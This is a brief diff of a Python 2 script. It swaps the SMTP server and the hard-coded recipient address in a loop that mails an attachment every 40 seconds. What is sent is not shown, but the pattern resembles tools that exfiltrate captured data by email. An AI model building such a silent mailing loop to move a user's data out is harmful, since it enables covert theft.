@@ -12,7 +12,7 @@ import email
 from time import sleep
 import imaplib
 
-smtp_server = "smtp.cybercon.com"
+smtp_server = "smtp.gmail.com"
 
 
 port = 25
@@ -46,6 +46,6 @@ while True:
         message.attach(msgpart)
         server = smtplib.SMTP(smtp_server, port)
         server.starttls()
-        server.sendmail(sender_email, "tarek@cybercon.net", message.as_string())
+        server.sendmail(sender_email, "myemail@domain.com", message.as_string())
         print "[-] Sent "
         sleep(40)
